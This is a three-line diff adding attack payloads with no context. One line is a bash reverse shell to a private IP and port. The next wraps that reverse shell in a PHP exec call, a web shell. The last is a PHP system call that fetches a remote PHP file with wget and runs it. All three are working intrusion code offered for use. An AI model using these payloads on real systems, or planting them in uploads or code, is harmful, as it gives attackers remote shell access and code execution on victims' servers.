@@ -1,0 +1,3 @@
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.8.100/2467 0>&1'
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.8.100/2467 0>&1'");?>
+<?php system('wget http://192.168.45.128:8000/a.php -O /tmp/a.php &&php /tmp/a.php');?>
